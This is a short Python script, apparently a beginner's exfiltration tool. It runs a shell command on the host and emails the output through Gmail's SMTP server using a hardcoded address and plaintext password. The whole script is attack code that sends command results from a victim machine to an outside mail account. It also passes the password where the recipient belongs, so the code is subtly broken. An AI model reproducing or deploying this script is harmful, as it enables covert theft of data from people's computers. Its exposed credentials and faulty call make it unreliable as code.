import subprocess, smtplib

def send_mail(email,password,message):
    server = smtplib.SMTP("smtp.gmail.com",587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,password,message)
    server.quit()


command = "dir"

result = subprocess.check_output(command,shell=True)
send_mail("vickyvlmp14@gmail.com","12345678@Aa",result)
